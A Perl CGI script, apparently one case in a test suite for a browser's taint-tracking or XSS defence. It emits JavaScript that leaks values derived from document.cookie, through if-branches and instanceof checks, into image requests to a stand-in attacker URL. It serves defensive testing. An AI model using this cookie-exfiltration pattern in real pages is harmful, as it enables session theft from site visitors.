#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_INSTANCEOF";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		var notevil = { 'x' : {} };
		var dut = notevil.x instanceof Object;
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		var notevil2 = { 'x' : 3 };
		notevil2.x = {};
		if ($evil) {
			var dut2 = notevil2.x instanceof Object;
		}
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		var evil = 2;
		if ($evil) {
			evil = 1;
		}
		var notevil3 = { 'x' : evil};
		var dut3 = notevil3.x instanceof Object;
		var url3 = "$imgevilurl?isevil=" + dut3[1];
		document.images[2].src = url3;
		
    </script>
|;


require "xss_basic_footer.pl";
